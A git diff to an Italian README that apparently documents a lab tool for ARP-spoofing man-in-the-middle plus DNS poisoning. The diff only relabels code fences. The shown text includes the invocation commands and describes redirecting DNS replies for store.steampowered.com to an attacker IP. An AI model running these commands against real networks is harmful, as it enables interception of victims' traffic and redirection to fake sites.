@@ -8,11 +8,11 @@ L'attacco **DNS poisoning** vuole inserire record fasulli in risposta a query DN
 
 ## ARP spoofing
 Il primo step prevede di realizzare un attacco MITM (Man in the middle) grazie all'ARP spoofing, tramite il comando:
-~~~bash
+~~~console
 $ sudo python3 arp_spoofing.py -g GATEWAY_IP -t TARGET_IP
 ~~~
 
-~~~bash
+~~~console
 usage: arp_poisoning.py [-h] [-g GATEWAY] [-t TARGET]
 
 options:
@@ -28,11 +28,11 @@ Verranno mandati pacchetti ARP alle due macchine indicate tra i parametri del co
 
 ## DNS poisoning
 Il secondo step prevede di modificare solo i pacchetti di tipo DNS Resource Record (DNS reply) verso *store.steampowered.com.* indirizzando il traffico verso l'indirizzo IP indicato.
-~~~bash
+~~~console
 $ sudo python3 dns_poisoning.py -i ATTACKER_IP
 ~~~
 
-~~~bash
+~~~console
 usage: dns_poisoning.py [-h] [-i IP]
 
 options:
